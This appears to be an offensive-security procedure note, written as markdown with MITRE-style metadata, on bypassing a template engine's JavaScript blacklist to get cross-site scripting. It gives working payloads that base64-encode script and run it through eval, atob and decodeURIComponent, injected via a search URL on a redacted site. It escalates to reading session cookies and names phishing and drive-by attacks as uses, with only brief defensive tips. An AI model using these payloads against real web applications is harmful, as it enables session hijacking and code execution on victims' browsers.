---
id: proc-uuid-4
name: Bypass-Blacklist-with-Base64-Encoding
tags:
  - xss-bypass
  - encoding
  - arbitrary-js
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/bypass-blacklist-base64-alert]]'
  - '[[commands/bypass-blacklist-cookie-theft]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:08.260Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Bypass-Blacklist-with-Base64-Encoding

## Summary

This procedure bypasses JavaScript blacklists in the template engine by base64-encoding the payload and using non-blacklisted window methods (eval, atob, decodeURIComponent) to decode and execute it, achieving full XSS.

## Description

Following detection of blacklists, this technique obfuscates payloads to evade filters in client-side templates. Encode JS like alert(1) to YWxlcnQoMSk=, then chain window['eval'] with atob and decodeURIComponent. Applicable in phishing or drive-by attacks on vulnerable web apps, outcomes include arbitrary code execution, cookie exfiltration, CORS bypass, and data forgery.

## Requirements

1. Confirmed JS blockage from prior attempt
2. Base64 encoder tool or online converter
3. Web browser for payload delivery

## Defense

Defensive measures and detection strategies:

- Whitelist allowed template functions and block eval/atob
- Encode/decode inputs server-side with validation
- Implement CSP to prevent base64-decoded script execution

## Objectives

1. Evade blacklists for JS execution
2. Demonstrate XSS impacts like alerts or data theft
3. Enable advanced attacks (CORS, forgery)

## Instructions

### Step 1: Encode Payload

**Context**: Base64 encode the target JS to hide from filters.

**Command** (Manual Encoding):

For alert(1): Use a base64 tool to get 'YWxlcnQoMSk='.

```bash
# Encoded: YWxlcnQoMSk=
# For cookies: YWxlcnQoZG9jdW1lbnQuY29va2llKQ==
```

> Prepare the chain: window['eval'](window['atob'](window['decodeURIComponent']('ENCODED')))

### Step 2: Inject and Execute

**Context**: Wrap in {{}} and load to trigger decoding and eval.

**Command** ([[commands/bypass-blacklist-base64-alert]]):
```bash
# Browser URL: www.███/News/Speeches?Search={{window['eval'](window['atob'](window['decodeURIComponent']('YWxlcnQoMSk=')))}}
```

> Alert(1) executes, popping a box with '1'.

### Step 3: Escalate to Data Theft

**Context**: Use similar payload for sensitive info extraction.

**Command** ([[commands/bypass-blacklist-cookie-theft]]):
```bash
# Browser URL: www.███/News/Speeches?Search={{window['eval'](window['atob'](window['decodeURIComponent']('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')))}}
```

> Alert shows document.cookie, exfiltrating session data.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/bypass-blacklist-base64-alert]]
- [[commands/bypass-blacklist-cookie-theft]]

## Tools Used


## Tags

- xss-bypass
- encoding
- arbitrary-js
